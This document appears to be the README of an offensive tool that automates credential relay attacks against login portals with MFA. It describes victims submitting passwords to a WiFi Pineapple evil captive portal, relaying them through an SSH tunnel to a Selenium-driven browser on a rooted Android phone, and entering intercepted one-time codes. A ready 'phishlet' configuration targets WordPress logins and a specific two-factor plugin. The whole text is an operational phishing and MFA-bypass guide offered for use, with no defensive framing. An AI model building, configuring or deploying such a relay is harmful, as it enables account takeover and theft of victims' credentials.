# auth-relay-framework

A modular framework for automating credential relay attacks against login portals with MFA support. Designed to run on Android via Termux with a Firefox browser controlled by Selenium, tunneled through a WiFi Pineapple.

---

## How it works

The framework intercepts credentials submitted to a captive portal (via WiFi Pineapple), relays them to the real target login page in a controlled browser session, captures the outcome, and forwards the result back to the Pineapple. MFA flows are handled by waiting for a one-time password to arrive via a separate HTTP endpoint and entering it automatically.

---

## Architecture

```
Victim device
    ↓ submits credentials to captive portal
WiFi Pineapple (Evil Portal)
    ↓ forwards to relay via SSH tunnel (port 9999)
Android device (Termux)
    ↓ HTTP server receives credentials
    ↓ Selenium + Firefox submits to real target
    ↓ detects outcome (success / MFA required / failed)
    ↑ sends result back to Pineapple (port 9998)
```

---

## File structure

```
AuthRelayApp/
├── app/src/main/
│   ├── java/com/example/authrelayapp/
│   │   └── MainActivity.kt         # Android app — setup, deployment, monitoring
│   └── res/raw/
│       ├── phishlet_py             # Target config — THE ONLY FILE YOU EDIT
│       ├── main_py                 # CLI entry point
│       ├── server_py               # HTTP server + browser lifecycle
│       ├── login_handler_py        # Login form interaction
│       ├── mfa_handler_py          # MFA/OTP entry and validation
│       ├── result_notifier_py      # Sends outcomes to Pineapple
│       ├── domain_utils_py         # Domain validation
│       └── utils_py                # Shared helpers (login path, OTP inputs)
```

---

## Targeting a new endpoint

Edit `phishlet_py` only. All other components read from it at runtime.

```python
# ---------------------------------------------------------------------------
# Login page
# ---------------------------------------------------------------------------

LOGIN_PATH              = "/wp-login.php"       # Path to the login page
USERNAME_FIELD          = "log"                 # name attribute of the username input
PASSWORD_FIELD          = "pwd"                 # name attribute of the password input
SUBMIT_BUTTON           = "wp-submit"           # name attribute of the submit button

# ---------------------------------------------------------------------------
# Login outcome detection
# ---------------------------------------------------------------------------

SUCCESS_URL_INDICATOR   = "wp-admin"            # String present in URL on successful login
LOGIN_ERROR_TEXT        = "incorrect username or password"  # Error text on failed login
LOGIN_PAGE_SUFFIX       = "wp-login.php"        # URL suffix indicating still on login page

# ---------------------------------------------------------------------------
# MFA detection
# ---------------------------------------------------------------------------

MFA_INDICATORS          = [
    "mo2f-digit-",
    "verification",
    "two-factor",
    "authenticator",
]

# ---------------------------------------------------------------------------
# MFA interaction
# ---------------------------------------------------------------------------

MFA_INPUT_ID_PATTERN    = "mo2f-digit-{i}"
MFA_INPUT_COUNT         = 6
MFA_OTP_LENGTH          = 6
MFA_VALIDATE_BUTTON_ID  = "mo2f_catchy_validate"
MFA_VALIDATE_BUTTON_JQUERY = "#mo2f_catchy_validate"
MFA_FAILURE_TEXT        = "attempts left"
MFA_SUCCESS_URL_INDICATOR = "wp-admin"
```

To find the correct values for a new target, inspect the login page source and identify the field names, button name, and URL patterns for success and failure.

---

## Error messages

The framework surfaces phishlet misconfiguration directly in the log output:

| Error | Likely cause |
|---|---|
| `PHISHLET ERROR: Could not find username field 'X'` | `USERNAME_FIELD` wrong or `LOGIN_PATH` resolves to wrong page |
| `PHISHLET ERROR: Could not fill credentials: Unable to locate element [name="X"]` | `PASSWORD_FIELD` wrong |
| `PHISHLET ERROR: Could not click submit: Unable to locate element [name="X"]` | `SUBMIT_BUTTON` wrong |
| `Login outcome: unclear` | `SUCCESS_URL_INDICATOR` wrong — login succeeded but outcome not recognized |
| `FATAL: Browser failed to load login page` | Domain unreachable or DNS failure |

---

## Requirements

- Android device with root access
- Termux + Termux:X11 installed
- Firefox and geckodriver installed in Termux
- WiFi Pineapple (Mark VII or Pager) on the same network
- SSH key pair configured between Termux and Pineapple

---

## Android app setup

The Android app (`AuthRelayApp`) handles:

1. Device type selection (Mark VII or Pager)
2. Domain input
3. Termux installation verification
4. Pineapple connectivity check
5. SSH key generation and transfer
6. Python module deployment
7. Evil WPA network configuration
8. Relay service startup and monitoring

On each run, all Python modules are redeployed from the bundled raw resources so the device always runs the latest version.

---

## Branches

| Branch | Description |
|---|---|
| `main` | Original monolithic script |
| `modular` | Refactored into modules |
| `phishlet` | Phishlet config system — target any endpoint by editing one file |
